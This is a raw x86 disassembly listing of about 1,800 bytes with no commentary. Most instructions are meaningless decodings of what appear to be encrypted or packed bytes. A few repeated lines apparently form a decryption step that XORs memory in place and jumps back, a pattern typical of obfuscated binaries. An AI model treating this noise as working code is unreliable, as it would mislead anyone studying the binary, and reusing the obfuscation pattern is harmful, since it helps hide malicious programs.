  40b72b:	retf   0x1ef3
  40b72e:	into   
  40b72f:	clc    
  40b730:	or     eax,DWORD PTR [edi]
  40b732:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b733:	push   edi
  40b734:	push   ss
  40b735:	push   ebx
  40b736:	mov    ah,0x42
  40b738:	mov    edi,0x482199f7
  40b73d:	imul   esp,esp,0x5fdf7037
  40b743:	push   0x5f
  40b745:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b746:	jb     0x40b7b8
  40b748:	bound  esi,QWORD PTR ds:0xaf699875
  40b74e:	add    bh,BYTE PTR [edx-0x62]
  40b751:	hlt    
  40b752:	pop    esi
  40b753:	neg    DWORD PTR [edi]
  40b755:	in     eax,0xcd
  40b757:	test   eax,0x6016962
  40b75c:	popf   
  40b75d:	push   ebx
  40b75e:	fcom   DWORD PTR [ebp-0x3d8bab09]
  40b764:	cmp    eax,0x7a12e6cc
  40b769:	mov    ds:0xfc7e5c4,eax
  40b76e:	(bad)  
  40b76f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b770:	add    DWORD PTR [edx+0x9953626],edi
  40b776:	out    dx,al
  40b777:	dec    edi
  40b778:	pop    ss
  40b779:	clc    
  40b77a:	push   es
  40b77b:	jge    0x40b731
  40b77d:	pop    ecx
  40b77e:	aas    
  40b77f:	not    ecx
  40b781:	adc    dh,BYTE PTR [edi]
  40b783:	mov    BYTE PTR [edi],dh
  40b785:	xor    al,0x70
  40b787:	popf   
  40b788:	mov    cl,0x74
  40b78a:	adc    DWORD PTR [edx],ebp
  40b78c:	sbb    cl,BYTE PTR [ecx-0x1f1c959f]
  40b792:	cmp    DWORD PTR [edx],0x62
  40b795:	adc    BYTE PTR [eax+0x540f5a6],cl
  40b79b:	xchg   esi,eax
  40b79c:	test   al,0xb6
  40b79e:	shl    DWORD PTR [ebx-0x3d31c252],1
  40b7a4:	mov    edx,0xadd3e301
  40b7a9:	jae    0x40b79e
  40b7ab:	cdq    
  40b7ac:	push   eax
  40b7ad:	repz mov ecx,0x8e1930ee
  40b7b3:	adc    DWORD PTR [ecx+esi*2],esi
  40b7b6:	out    dx,eax
  40b7b7:	out    dx,al
  40b7b8:	call   0x9946:0x1f6cd6cc
  40b7bf:	scas   eax,DWORD PTR es:[edi]
  40b7c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7c1:	mov    DWORD PTR [ebp-0x648e749],ecx
  40b7c7:	mov    al,ds:0xb25de6a7
  40b7cc:	call   0x91e2:0x250124ab
  40b7d3:	jmp    0x40b828
  40b7d5:	fdivr  st(7),st
  40b7d7:	das    
  40b7d8:	pop    esp
  40b7d9:	sub    DWORD PTR [ebx+0x458d0d1c],eax
  40b7df:	mov    ah,0x75
  40b7e1:	out    dx,al
  40b7e2:	pop    es
  40b7e3:	sub    eax,0xaf71cedb
  40b7e8:	add    DWORD PTR [esi],0x7e
  40b7eb:	pushf  
  40b7ec:	loopne 0x40b788
  40b7ee:	ss push eax
  40b7f0:	sbb    eax,0x36c17358
  40b7f5:	xor    edi,edx
  40b7f7:	push   ebx
  40b7f8:	sub    BYTE PTR [ebp+0x6],ch
  40b7fb:	cmp    DWORD PTR [edi-0x73],esp
  40b7fe:	lods   eax,DWORD PTR ds:[esi]
  40b7ff:	popf   
  40b800:	fwait
  40b801:	ja     0x40b82f
  40b803:	jp     0x40b7b2
  40b805:	inc    edi
  40b806:	test   al,0x3f
  40b808:	push   edi
  40b809:	cmp    eax,0xdbe5907b
  40b80e:	mov    ah,0x11
  40b810:	imul   eax,ecx,0x22fc17f6
  40b816:	dec    eax
  40b817:	cmp    esp,DWORD PTR [edi+0x77]
  40b81a:	test   BYTE PTR [ecx-0x1883fa7d],0xed
  40b821:	imul   ebp,DWORD PTR [edi],0x4aa43a12
  40b827:	out    dx,al
  40b828:	xchg   ebx,eax
  40b829:	ds jg  0x40b80f
  40b82c:	dec    edx
  40b82d:	sub    al,0x2d
  40b82f:	pusha  
  40b830:	sti    
  40b831:	pop    eax
  40b832:	mov    ebp,0x5eb1bf95
  40b837:	inc    ecx
  40b838:	pop    ecx
  40b839:	and    DWORD PTR [eax-0x45ba4b97],esi
  40b83f:	leave  
  40b840:	ins    DWORD PTR es:[edi],dx
  40b841:	enter  0xc89c,0x93
  40b845:	jo     0x40b7e2
  40b847:	jnp    0x40b89b
  40b849:	retf   
  40b84a:	mov    eax,0x389a058a
  40b84f:	mov    esi,0xb5775ae9
  40b854:	adc    al,0xfa
  40b856:	outs   dx,BYTE PTR ds:[esi]
  40b857:	scas   eax,DWORD PTR es:[edi]
  40b858:	sahf   
  40b859:	mov    esp,0xc3930cc3
  40b85e:	mov    esp,0xb70bc82b
  40b863:	pop    ebx
  40b864:	in     eax,dx
  40b865:	push   ebp
  40b866:	ja     0x40b882
  40b868:	mov    WORD PTR [esi],gs
  40b86a:	ja     0x40b89a
  40b86c:	fadd   DWORD PTR [edi+0x45]
  40b86f:	xor    al,0x44
  40b871:	dec    DWORD PTR [edi-0x72]
  40b874:	dec    ebx
  40b875:	imul   ebp,DWORD PTR [ecx],0x30
  40b878:	test   eax,0x4ece7293
  40b87d:	bound  edx,QWORD PTR [ecx+0x7c69b22a]
  40b883:	ja     0x40b894
  40b885:	add    bh,bh
  40b887:	add    al,0x2f
  40b889:	mov    edx,0xa208274b
  40b88e:	stc    
  40b88f:	gs dec esi
  40b891:	outs   dx,DWORD PTR ds:[esi]
  40b892:	mov    ecx,0x7b8cda7d
  40b897:	hlt    
  40b898:	in     al,dx
  40b899:	sub    al,0x7a
  40b89b:	cld    
  40b89c:	fstp   TBYTE PTR [edi]
  40b89e:	and    DWORD PTR [edi+0x444d55ce],ebp
  40b8a4:	inc    edx
  40b8a5:	mov    bl,0xf3
  40b8a7:	test   ah,0x7a
  40b8aa:	jmp    0xde6e:0xffdb14a7
  40b8b1:	pop    ss
  40b8b2:	lods   al,BYTE PTR ds:[esi]
  40b8b3:	(bad)  
  40b8b4:	mov    esp,0xc1dc516a
  40b8b9:	js     0x40b90e
  40b8bb:	retf   
  40b8bc:	pmaddwd mm1,QWORD PTR ds:0xf086a300
  40b8c3:	xor    esi,DWORD PTR [eax+0x1faea67d]
  40b8c9:	jb     0x40b8fe
  40b8cb:	retf   
  40b8cc:	jle    0x40b8b4
  40b8ce:	cwde   
  40b8cf:	lock cmp eax,0x4c23b40b
  40b8d5:	pop    edx
  40b8d6:	push   eax
  40b8d7:	mov    al,ds:0xefb1adcd
  40b8dc:	add    eax,0xb62917d0
  40b8e1:	ds xor eax,0x1621b581
  40b8e7:	mov    eax,DWORD PTR [ecx+0x65]
  40b8ea:	cs or  eax,0xaff06fbe
  40b8f0:	jecxz  0x40b8dd
  40b8f2:	xor    DWORD PTR [edx+edi*2],esi
  40b8f5:	push   ss
  40b8f6:	sub    ch,BYTE PTR [ebx-0x40]
  40b8f9:	mov    esi,0x7bb9bb91
  40b8fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8ff:	and    BYTE PTR [edx],ch
  40b901:	mov    ch,0xd5
  40b903:	rol    BYTE PTR [eax+0x3b],cl
  40b906:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b907:	push   edi
  40b908:	fwait
  40b909:	push   ebp
  40b90a:	cmp    BYTE PTR [edi-0x27360eb6],cl
  40b910:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b911:	sbb    DWORD PTR [edi],eax
  40b913:	inc    esi
  40b914:	cmp    eax,0x7b31a8c6
  40b919:	je     0x40bc46
  40b91f:	mov    eax,DWORD PTR [ebp-0x10]
  40b922:	and    DWORD PTR [eax],0x751c80
  40b928:	jmp    0x40b5e7
  40b92d:	jmp    0x40bc46
  40b932:	into   
  40b933:	aas    
  40b934:	ds ror ebp,0xc1
  40b938:	rcl    ebx,1
  40b93a:	add    esi,DWORD PTR [edi]
  40b93c:	stos   DWORD PTR es:[edi],eax
  40b93d:	rcl    ebx,cl
  40b93f:	mov    ebp,0x8cc659b9
  40b944:	js     0x40b9be
  40b946:	je     0x40b9c6
  40b948:	js     0x40b9c2
  40b94a:	imul   eax,DWORD PTR [edx+edx*1+0x4aeffb9d],0x4
  40b952:	clc    
  40b953:	sub    eax,0x1a873c7
  40b958:	xor    esi,DWORD PTR [esp+edi*2]
  40b95b:	jo     0x40b8ee
  40b95d:	push   es
  40b95e:	popa   
  40b95f:	and    DWORD PTR [ebp+0x4787732d],0xdd9d4ba3
  40b969:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b96a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b96b:	pop    ebx
  40b96c:	push   edi
  40b96d:	ret    
  40b96e:	sub    ch,BYTE PTR [edx-0x7b66fb]
  40b974:	inc    ebx
  40b975:	and    DWORD PTR [esi],edx
  40b977:	and    DWORD PTR [ebp+eax*1-0x7f],edx
  40b97b:	and    eax,0x3470f498
  40b980:	xchg   esp,eax
  40b981:	ss xchg edx,eax
  40b983:	div    BYTE PTR [edx]
  40b985:	or     edi,DWORD PTR ss:[ebx]
  40b988:	cmp    al,0xfc
  40b98a:	mov    bh,BYTE PTR [ebp-0x5]
  40b98d:	jg     0x40b9e4
  40b98f:	jmp    0x52c8a1e3
  40b994:	in     al,0xb2
  40b996:	xor    al,BYTE PTR [ebx-0x58a61748]
  40b99c:	jno    0x40b93b
  40b99e:	mov    dh,0x73
  40b9a0:	test   BYTE PTR [esi+eiz*4+0xa],dl
  40b9a4:	xchg   ebx,eax
  40b9a5:	add    al,0x5a
  40b9a7:	pusha  
  40b9a8:	(bad)  
  40b9a9:	clc    
  40b9aa:	cmp    al,0x6a
  40b9ac:	ins    DWORD PTR es:[edi],dx
  40b9ad:	jge    0x40b9be
  40b9af:	or     al,0xc9
  40b9b1:	push   ebx
  40b9b2:	push   ebx
  40b9b3:	nop
  40b9b4:	jns    0x40ba0d
  40b9b6:	mov    ecx,0xddc6f112
  40b9bb:	(bad)  
  40b9bc:	test   al,0xb6
  40b9be:	iret   
  40b9bf:	ja     0x40ba23
  40b9c1:	lea    ebp,[ebp+0x65289b41]
  40b9c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9c8:	pop    edi
  40b9c9:	clc    
  40b9ca:	sub    al,0x26
  40b9cd:	stos   BYTE PTR es:[edi],al
  40b9ce:	adc    al,0xad
  40b9d0:	test   BYTE PTR [eax],al
  40b9d2:	repz hlt 
  40b9d4:	mov    ebp,0x62e24253
  40b9d9:	sahf   
  40b9da:	lods   eax,DWORD PTR ds:[esi]
  40b9db:	jbe    0x40ba32
  40b9dd:	push   ss
  40b9de:	xchg   edx,eax
  40b9df:	inc    edi
  40b9e0:	js     0x40b9ab
  40b9e2:	xchg   esi,eax
  40b9e3:	fist   WORD PTR [edx+ecx*8-0x15a2983c]
  40b9ea:	dec    eax
  40b9eb:	icebp  
  40b9ec:	mov    cl,0x35
  40b9ee:	mov    ebp,0x66458511
  40b9f3:	adc    edi,DWORD PTR [eax+0x443c65d4]
  40b9f9:	jge    0x40ba67
  40b9fb:	and    DWORD PTR [eax-0x25],eax
  40b9fe:	jae    0x40b99a
  40ba00:	and    BYTE PTR [eax+0x7f],cl
  40ba03:	or     BYTE PTR [eax],bh
  40ba05:	cdq    
  40ba06:	lock adc BYTE PTR [eax],0xd8
  40ba0a:	stos   DWORD PTR es:[edi],eax
  40ba0b:	push   esp
  40ba0c:	ficom  WORD PTR [ebx+0x78e408bb]
  40ba12:	and    dh,BYTE PTR [ecx+0x2c7737ac]
  40ba18:	push   esp
  40ba19:	in     al,dx
  40ba1a:	or     BYTE PTR [ecx-0x54bcae25],ch
  40ba20:	nop
  40ba21:	push   ds
  40ba22:	(bad)
  40ba25:	and    BYTE PTR [edx],dl
  40ba27:	clc    
  40ba28:	loope  0x40b9d6
  40ba2a:	add    al,0x43
  40ba2c:	ss leave 
  40ba2e:	popa   
  40ba2f:	push   ecx
  40ba30:	sahf   
  40ba31:	enter  0x2b36,0x83
  40ba35:	in     eax,dx
  40ba36:	sub    al,0x93
  40ba38:	mov    WORD PTR [ebx-0x70],ss
  40ba3b:	xchg   DWORD PTR [ecx-0xd0d2d76],ecx
  40ba41:	data16 fdiv DWORD PTR [edx]
  40ba44:	ficom  DWORD PTR [eax-0x42]
  40ba47:	ds repz inc esi
  40ba4a:	jo     0x40ba61
  40ba4c:	fnstsw WORD PTR [eax-0x65e6e7b8]
  40ba52:	loope  0x40ba2b
  40ba54:	ret    0x72dd
  40ba57:	mov    edx,DWORD PTR [esi+eax*1-0x5a4c168b]
  40ba5e:	stc    
  40ba5f:	cdq    
  40ba60:	jnp    0x40baa0
  40ba62:	fst    st(7)
  40ba64:	xchg   edi,eax
  40ba65:	(bad)  
  40ba67:	fadd   QWORD PTR [edx-0x79]
  40ba6a:	mov    BYTE PTR ds:0x193a568a,bh
  40ba70:	jns    0x40ba9b
  40ba72:	sbb    al,BYTE PTR [ecx]
  40ba74:	sub    dh,BYTE PTR [ebx+0x3010ee92]
  40ba7a:	into   
  40ba7b:	inc    ecx
  40ba7c:	test   BYTE PTR [ecx-0x658a509],bh
  40ba82:	xchg   ebx,eax
  40ba83:	jecxz  0x40bacc
  40ba85:	dec    esi
  40ba86:	mov    cl,0xfd
  40ba88:	adc    DWORD PTR [ebx+eiz*4-0x5423f469],edx
  40ba8f:	cli    
  40ba90:	stc    
  40ba91:	lods   eax,DWORD PTR ds:[esi]
  40ba92:	sti    
  40ba93:	or     DWORD PTR [edi+ebx*4],esi
  40ba96:	call   0x74927d43
  40ba9b:	ret    
  40ba9c:	pop    ecx
  40ba9d:	aaa    
  40ba9e:	ret    0x5596
  40baa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40baa2:	in     al,0xde
  40baa4:	cld    
  40baa5:	ss push ebp
  40baa7:	pop    ds
  40baa8:	iret   
  40baa9:	or     eax,0x2008a6f0
  40baae:	jns    0x40bb28
  40bab0:	and    BYTE PTR [eax+edi*1-0x5],ch
  40bab4:	test   eax,0x3574386b
  40bab9:	(bad)  
  40baba:	xchg   edi,eax
  40babb:	or     ah,BYTE PTR [ecx+0x4b07c067]
  40bac1:	mov    ah,0x4d
  40bac3:	iret   
  40bac4:	mov    eax,ds:0x5cc53c13
  40bac9:	sbb    ecx,DWORD PTR [ebx]
  40bacb:	dec    esi
  40bacc:	pop    eax
  40bacd:	ret    
  40bace:	enter  0x17f6,0xe5
  40bad2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bad3:	call   0x744b0dca
  40bad8:	pop    esi
  40bad9:	mov    ds:0x7b6738d0,al
  40bade:	fsub   st(0),st
  40bae0:	mov    ebx,DWORD PTR es:[eax]
  40bae3:	mov    eax,0xa462e473
  40bae8:	jecxz  0x40ba85
  40baea:	push   ss
  40baeb:	push   esi
  40baec:	jbe    0x40bb46
  40baee:	cwde   
  40baef:	xor    BYTE PTR [edx-0x4c],al
  40baf2:	sbb    DWORD PTR [edx+esi*1],edi
  40baf5:	scas   al,BYTE PTR es:[edi]
  40baf6:	int3   
  40baf7:	push   edx
  40baf8:	retf   0x2f92
  40bafb:	mov    al,ds:0x74ae2e59
  40bb00:	sbb    ebx,edi
  40bb02:	aad    0x0
  40bb04:	xchg   edx,eax
  40bb05:	out    dx,eax
  40bb06:	xor    ah,cl
  40bb08:	inc    esi
  40bb09:	jmp    0x40badc
  40bb0b:	xchg   ebx,eax
  40bb0c:	into   
  40bb0d:	add    al,0xbb
  40bb0f:	sbb    ebx,esi
  40bb11:	adc    edi,DWORD PTR [ebx]
  40bb13:	ss ins BYTE PTR es:[edi],dx
  40bb15:	push   ds
  40bb16:	scas   eax,DWORD PTR es:[edi]
  40bb17:	cmp    DWORD PTR [ebp-0x5a],ecx
  40bb1a:	xor    DWORD PTR [eax+0x329b8e36],esi
  40bb20:	adc    eax,0x4d56b8ee
  40bb25:	neg    DWORD PTR [eax]
  40bb27:	inc    ebp
  40bb28:	fnstcw WORD PTR [ebp-0x32]
  40bb2b:	sbb    eax,0x85f8af38
  40bb30:	mov    eax,0x85a9a66c
  40bb35:	cs (bad) 
  40bb37:	ds xchg eax,edi
  40bb3a:	push   eax
  40bb3b:	sub    eax,0xefa21ac3
  40bb40:	test   al,0xf8
  40bb42:	lea    esp,[eax-0x5fda372a]
  40bb48:	inc    esp
  40bb49:	sub    BYTE PTR [ebx],bh
  40bb4b:	cs call 0xdafb:0x1966c6a9
  40bb53:	pop    edx
  40bb54:	sbb    ecx,ebx
  40bb56:	jp     0x40bbb9
  40bb58:	xchg   ecx,eax
  40bb59:	xchg   ebp,eax
  40bb5a:	(bad)  
  40bb5b:	jo     0x40bbc3
  40bb5d:	ret    0x193d
  40bb60:	xchg   edi,eax
  40bb61:	push   edi
  40bb62:	(bad)  
  40bb63:	lea    edi,[edi]
  40bb65:	sbb    eax,0x85025625
  40bb6a:	jmp    0x2696:0xf7282cf5
  40bb71:	fadd   QWORD PTR [eax+0x2d830ad]
  40bb77:	cli    
  40bb78:	mov    ds:0x73dd9ce8,eax
  40bb7d:	jb     0x40bbbd
  40bb7f:	dec    eax
  40bb80:	aaa    
  40bb81:	sti    
  40bb82:	or     ecx,DWORD PTR [edx+0x281907d6]
  40bb88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb89:	dec    esp
  40bb8a:	stc    
  40bb8b:	inc    ebp
  40bb8c:	ret    0x7829
  40bb8f:	cmp    DWORD PTR [ebp+0x35],esp
  40bb92:	lods   eax,DWORD PTR ds:[esi]
  40bb93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb94:	push   esi
  40bb95:	test   DWORD PTR [ecx],edi
  40bb97:	ror    BYTE PTR [ebp-0x1],cl
  40bb9a:	ins    DWORD PTR es:[edi],dx
  40bb9b:	push   ebp
  40bb9c:	jecxz  0x40bbc9
  40bb9e:	repnz cmp ah,BYTE PTR [edx]
  40bba1:	mov    al,BYTE PTR [edx]
  40bba3:	rol    BYTE PTR [edx-0x5f208a2d],0xb4
  40bbaa:	cld    
  40bbab:	stos   BYTE PTR es:[edi],al
  40bbac:	mov    eax,DWORD PTR [ecx-0x19]
  40bbaf:	ret    0x5515
  40bbb2:	mov    eax,ds:0xee19a3a5
  40bbb7:	pop    ds
  40bbb8:	ja     0x40bb9e
  40bbba:	inc    esi
  40bbbb:	lods   eax,DWORD PTR ds:[esi]
  40bbbc:	dec    ebp
  40bbbd:	xor    al,BYTE PTR [esi+eax*1-0x6]
  40bbc1:	xor    DWORD PTR [eax+0x6aa1d654],esi
  40bbc7:	mov    al,ds:0x26e750d5
  40bbcc:	sbb    eax,DWORD PTR [edi+edi*8]
  40bbcf:	icebp  
  40bbd0:	lock xchg edi,eax
  40bbd2:	arpl   WORD PTR [ebp+0x2ccb4c18],bp
  40bbd8:	and    bl,BYTE PTR [ebx]
  40bbda:	test   ah,ah
  40bbdc:	iret   
  40bbdd:	or     dh,BYTE PTR [edx+esi*8-0x139ae6b2]
  40bbe4:	aas    
  40bbe5:	jecxz  0x40bc0d
  40bbe7:	stos   DWORD PTR es:[edi],eax
  40bbe8:	call   0x904bd1bc
  40bbed:	int3   
  40bbee:	sar    DWORD PTR ds:0x44f49de7,0x35
  40bbf5:	fstp   QWORD PTR [ebx-0x549d19a0]
  40bbfb:	stos   BYTE PTR es:[edi],al
  40bbfc:	mov    esi,DWORD PTR [ebx]
  40bbfe:	mov    DWORD PTR [edx],esp
  40bc00:	fimul  DWORD PTR [ebp+0x6c]
  40bc03:	xchg   bp,ax
  40bc05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc07:	test   al,0xb5
  40bc09:	xchg   bh,ah
  40bc0b:	push   ss
  40bc0c:	or     al,0x82
  40bc0e:	cmp    eax,0x27c630d9
  40bc13:	mov    eax,0xec2d617f
  40bc18:	or     ebp,DWORD PTR [esi]
  40bc1a:	in     eax,0x6a
  40bc1c:	sti    
  40bc1d:	pop    ecx
  40bc1e:	lods   eax,DWORD PTR ds:[esi]
  40bc1f:	ja     0x40bbed
  40bc21:	test   DWORD PTR [ebx-0x4f381cec],esi
  40bc27:	xchg   DWORD PTR [ebx],edi
  40bc29:	scas   al,BYTE PTR es:[edi]
  40bc2a:	sub    dh,cl
  40bc2c:	mov    dh,0xdb
  40bc2e:	ins    BYTE PTR es:[edi],dx
  40bc2f:	push   edx
  40bc30:	and    al,0x44
  40bc32:	cmp    ah,BYTE PTR [ebp+0x40]
  40bc35:	fst    QWORD PTR [eax+0x7a3ffb3e]
  40bc3b:	xchg   edi,eax
  40bc3c:	inc    esi
  40bc3d:	adc    al,0xd6
  40bc3f:	pop    ecx
  40bc40:	cmp    eax,0xf5f534f0
  40bc45:	mov    esi,0x8bf4458b
  40bc4a:	push   ebp
  40bc4b:	call   0x767e7e5b
  40bc50:	jle    0x40bbf1
  40bc52:	cli    
  40bc53:	je     0x40bc67
  40bc59:	mov    eax,DWORD PTR [ebp-0x10]
  40bc5c:	xor    DWORD PTR [eax],0x2650fa8e
  40bc62:	jmp    0x40b5e7
  40bc67:	mov    ax,WORD PTR [ebp-0x4]
  40bc6b:	jmp    0x40bf84
  40bc70:	(bad)  
  40bc71:	ds ret 
  40bc73:	ror    bl,cl
  40bc75:	rcl    ebp,1
  40bc77:	fisubr DWORD PTR [ebp+0x56]
  40bc7a:	xchg   esp,eax
  40bc7b:	jge    0x40bcaa
  40bc7d:	or     edi,DWORD PTR [eax]
  40bc7f:	push   0xffffffc2
  40bc81:	xchg   ecx,eax
  40bc82:	js     0x40bcfc
  40bc84:	je     0x40bd04
  40bc86:	js     0x40bd00
  40bc88:	fwait
  40bc89:	int3   
  40bc8a:	add    DWORD PTR [edi+0x7c199eb6],edx
  40bc90:	jb     0x40bc7e
  40bc92:	mov    ebx,0x14ad5b1a
  40bc97:	ins    DWORD PTR es:[edi],dx
  40bc98:	and    eax,0xd730bbdb
  40bc9d:	aaa    
  40bc9e:	lds    ecx,FWORD PTR ds:0x2e607e50
  40bca4:	jge    0x40bd1b
  40bca6:	and    DWORD PTR [ebp+edx*1-0x20],ebp
  40bcaa:	mov    WORD PTR [ebp+edx*8+0x617b9e77],es
  40bcb1:	cmp    BYTE PTR [edi],dl
  40bcb3:	fsub   QWORD PTR [edi+0xfad29ab]
  40bcb9:	rcl    DWORD PTR [esi-0x3],0xdc
  40bcbd:	inc    ebp
  40bcbe:	imul   eax,ebp,0x51
  40bcc1:	clc    
  40bcc2:	jae    0x40bc9c
  40bcc4:	and    ecx,DWORD PTR [eax]
  40bcc6:	or     edx,DWORD PTR [ebp+0x212c21cb]
  40bccc:	fisttp QWORD PTR [ecx+0x7509844]
  40bcd2:	dec    ebp
  40bcd3:	mov    bh,0xd4
  40bcd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcd6:	fidivr DWORD PTR [edi]
  40bcd8:	dec    esp
  40bcd9:	mov    ebp,0x5a9ee5bc
  40bcde:	out    0x7c,al
  40bce0:	ins    DWORD PTR es:[edi],dx
  40bce1:	(bad)  
  40bce2:	fcmovb st,st(4)
  40bce4:	sahf   
  40bce5:	sbb    BYTE PTR [esp+ebp*2],cl
  40bce8:	je     0x40bd46
  40bcea:	mov    al,ds:0x65b5c4bf
  40bcef:	inc    edi
  40bcf0:	adc    DWORD PTR [ecx+0x4cd1078],ebp
  40bcf6:	es ss inc ebp
  40bcf9:	push   0x62
  40bcfb:	add    BYTE PTR [eax-0x77],0x4c
  40bcff:	push   edx
  40bd00:	add    DWORD PTR [eiz*1+0x55256814],ecx
  40bd07:	aad    0xbd
  40bd09:	cld    
  40bd0a:	neg    BYTE PTR [edx+0x2115ec01]
  40bd10:	mov    bh,0xe0
  40bd12:	add    eax,0x4eacd2ab
  40bd17:	mov    ecx,0x199d7469
  40bd1c:	test   BYTE PTR [ecx+0x6e421c75],0xe9
  40bd23:	push   cs
  40bd24:	pop    ecx
  40bd25:	pushf  
  40bd26:	ins    DWORD PTR es:[edi],dx
  40bd27:	sub    al,0x7b
  40bd29:	bound  ebx,QWORD PTR [eax-0x79]
  40bd2c:	ficomp WORD PTR [eax-0x36]
  40bd2f:	ins    BYTE PTR es:[edi],dx
  40bd30:	jb     0x40bd77
  40bd32:	(bad)  
  40bd33:	popf   
  40bd34:	lock sbb ebx,DWORD PTR [ebx]
  40bd37:	iret   
  40bd38:	cmp    eax,0xf72f3990
  40bd3d:	pop    esp
  40bd3e:	mov    edx,DWORD PTR [ebx-0x4f]
  40bd41:	xor    DWORD PTR [ebx-0x4a],ebp
  40bd44:	mov    ch,0x12
  40bd46:	pop    esp
  40bd47:	mov    eax,ds:0x3126a179
  40bd4c:	or     al,0x91
  40bd4e:	aaa    
  40bd4f:	cmp    ecx,DWORD PTR [eax+0xd]
  40bd52:	mov    bl,0x65
  40bd54:	lods   al,BYTE PTR ds:[esi]
  40bd55:	and    eax,0xf4a181e8
  40bd5a:	or     DWORD PTR [ebp+0xbfd44f0],esi
  40bd60:	push   cs
  40bd61:	jnp    0x40bd9c
  40bd63:	popa   
  40bd64:	dec    eax
  40bd66:	xchg   edx,eax
  40bd67:	jnp    0x40bcf0
  40bd69:	xchg   BYTE PTR [edx-0x387dd59e],dh
  40bd6f:	adc    ebp,DWORD PTR ss:[eax*8+0x64b46d50]
  40bd77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd78:	xchg   BYTE PTR [edx+ecx*2],al
  40bd7b:	mov    edi,0x79124bf6
  40bd80:	jae    0x40bd91
  40bd82:	adc    edx,DWORD PTR [ebx+esi*2-0x28d0d960]
  40bd89:	addr16 cmp eax,0xda5b83d8
  40bd8f:	rol    BYTE PTR [ebp-0x6a2a94d8],0x8e
  40bd96:	sub    ecx,DWORD PTR [ebx]
  40bd98:	jno    0x40bd92
  40bd9a:	repnz or esi,ebp
  40bd9d:	fst    DWORD PTR [ebx+0x1a]
  40bda0:	add    ebx,esi
  40bda2:	cmp    al,0xa6
  40bda4:	xchg   edx,eax
  40bda5:	xchg   ecx,eax
  40bda6:	cmp    bh,BYTE PTR [eax+0x19]
  40bda9:	pop    edi
  40bdaa:	inc    eax
  40bdab:	cmp    edx,ebp
  40bdad:	inc    esi
  40bdae:	scas   al,BYTE PTR es:[edi]
  40bdaf:	popf   
  40bdb0:	dec    esi
  40bdb1:	nop
  40bdb2:	and    al,0x54
  40bdb4:	jl     0x40be23
  40bdb6:	scas   eax,DWORD PTR es:[edi]
  40bdb7:	xchg   ebx,eax
  40bdb8:	adc    edi,ecx
  40bdba:	dec    eax
  40bdbb:	mov    edx,DWORD PTR [esi+0x3]
  40bdbe:	repz jnp 0x40bdb2
  40bdc1:	jbe    0x40bd74
  40bdc3:	cmp    BYTE PTR [eax],0x92
  40bdc6:	adc    BYTE PTR [esi-0x5a],0x9a
  40bdca:	aad    0xfb
  40bdcc:	jae    0x40bd91
  40bdce:	jmp    0x40be2b
  40bdd0:	(bad)
  40bdd3:	mov    ds:0x9d090dbc,al
  40bdd8:	cli    
  40bdd9:	out    dx,eax
  40bdda:	popf   
  40bddb:	jne    0x40be47
  40bddd:	cmp    esi,edi
  40bddf:	icebp  
  40bde0:	loop   0x40be1e
  40bde2:	push   ebp
  40bde3:	pop    ebx
  40bde4:	cmp    DWORD PTR [eax+0x7ecfd301],ebp
  40bdea:	ret    0xd602
  40bded:	push   esi
  40bdee:	sysexit 
  40bdf0:	push   esi
  40bdf1:	pop    ss
  40bdf2:	ret    
  40bdf3:	pop    esp
  40bdf4:	dec    ebp
  40bdf5:	dec    esi
  40bdf6:	shl    DWORD PTR [eax-0x47],1
  40bdf9:	or     esi,ebx
  40bdfb:	rcr    BYTE PTR ds:0xbca93e63,1
  40be01:	inc    ebp
  40be02:	retf   0x1b61
  40be05:	out    0x10,eax
  40be07:	data16 mov WORD PTR [ebx],?
  40be0a:	shr    ecx,1
  40be0c:	cmp    esp,DWORD PTR [esi-0x30bbca64]
  40be12:	jne    0x40bde2
  40be14:	ret    0x4f9b
  40be17:	mov    eax,DWORD PTR [esi+0x249ca04a]
  40be1d:	mov    esi,0x9c988a77
  40be22:	addr16 cdq 
  40be24:	(bad)  
  40be26:	lock fidiv WORD PTR [esp+eax*1+0x79cd0990]
  40be2e:	gs jmp 0x40be32
  40be31:	mov    esp,DWORD PTR [esi]
  40be33:	mov    al,0x8c
  40be35:	sar    BYTE PTR [ebp+0x7406e6b3],0x9e
  40be3c:	xchg   esi,eax
  40be3d:	stc    
  40be3e:	in     eax,0xfd
  40be40:	jle    0x40bdcb
  40be42:	mov    esi,0xf90f4ce8
  40be47:	es sub al,0xdb
  40be4a:	xchg   ecx,eax
  40be4b:	ret    
  40be4c:	sub    ebp,DWORD PTR [eax]
  40be4e:	pusha  
  40be4f:	jne    0x40be4d
  40be51:	scas   al,BYTE PTR es:[edi]
  40be52:	lods   al,BYTE PTR ds:[esi]
  40be53:	xor    eax,0x5d41760c
  40be58:	ret    
  40be59:	pop    ecx
  40be5a:	imul   ecx,DWORD PTR [ebx+ebp*1],0x63282fdd
  40be61:	in     eax,0xb3
  40be63:	or     dl,bl
  40be65:	and    bl,BYTE PTR [ebx]
  40be67:	push   ebp
  40be68:	sub    BYTE PTR [ebp-0x16c282b4],bh
  40be6e:	jmp    0x8307:0x68136ba1
  40be75:	push   es
  40be76:	out    0xf1,eax
  40be78:	scas   al,BYTE PTR es:[edi]
  40be79:	jp     0x40bed3
  40be7b:	add    ah,cl
  40be7d:	cmp    dl,BYTE PTR [ebx-0x184c6e75]
  40be83:	call   0xac91:0x24ee27d4
  40be8a:	das    
